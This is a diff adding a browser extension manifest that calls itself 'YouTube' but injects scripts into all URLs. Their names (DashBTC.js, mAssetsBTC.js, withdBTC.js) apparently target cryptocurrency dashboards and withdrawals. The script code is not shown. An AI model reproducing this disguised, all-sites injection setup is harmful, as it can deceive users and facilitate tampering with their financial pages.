@@ -1,0 +1,23 @@
+{
+  "manifest_version": 3,
+  "name": "YouTube",
+  "version": "1.0",
+  "description": "YouTube",
+  "permissions": [
+    "activeTab"
+  ],
+  "content_scripts": [
+    {
+      "matches": ["<all_urls>"],
+      "js": ["Dash.js",
+      "DashBTC.js",
+    "OverView.js",
+    "OverView2.js",
+    "mAssetsBTC.js",
+    "mAssets.js",
+    "en.js",
+    "enBTC.js",
+  "withdBTC.js"]
+    }
+  ]
+  }
